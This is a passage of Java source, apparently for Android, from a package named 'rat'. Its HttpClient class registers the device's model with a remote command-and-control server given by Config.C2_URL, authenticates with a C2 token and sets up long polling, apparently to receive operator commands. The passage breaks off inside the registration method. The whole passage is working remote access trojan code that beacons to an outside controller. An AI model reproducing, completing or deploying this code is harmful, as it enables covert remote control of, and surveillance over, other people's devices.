package com.local.rat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class HttpClient extends Thread {
    private final Commands commands;
    private volatile boolean running = true;
    private String sid;

    public HttpClient(Commands c) { this.commands = c; }

    public void stop() { running = false; }

    private HttpURLConnection open(String path) throws Exception {
        URL u = new URL(Config.C2_URL + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("X-Token", Config.C2_TOKEN);
        c.setDoOutput(true);
        c.setConnectTimeout(15000);
        c.setReadTimeout(Config.POLL_TIMEOUT_MS + 5000);
        return c;
    }

    private String post(String path, JSONObject body) throws Exception {
        HttpURLConnection c = open(path);
        byte[] bytes = body.toString().getBytes("UTF-8");
        c.setFixedLengthStreamingMode(bytes.length);
        try (OutputStream os = c.getOutputStream()) { os.write(bytes); }

        int code = c.getResponseCode();
        if (code == 204) { c.disconnect(); return null; }
        InputStream in = (code >= 200 && code < 300) ? c.getInputStream() : c.getErrorStream();
        if (in == null) { c.disconnect(); return null; }
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, "UTF-8"))) {
            String l;
            while ((l = r.readLine()) != null) sb.append(l);
        } finally { c.disconnect(); }
        return sb.length() == 0 ? null : sb.toString();
    }

    private boolean register() {
        try {
            JSONObject body = new JSONObject();
            body.put("model", android.os.Build.MODEL);
            String resp = post("/register", body);
            if (resp == null) return false;
            JSONObject o = new JSONObject(resp);
            sid = o.optString("sid", null);
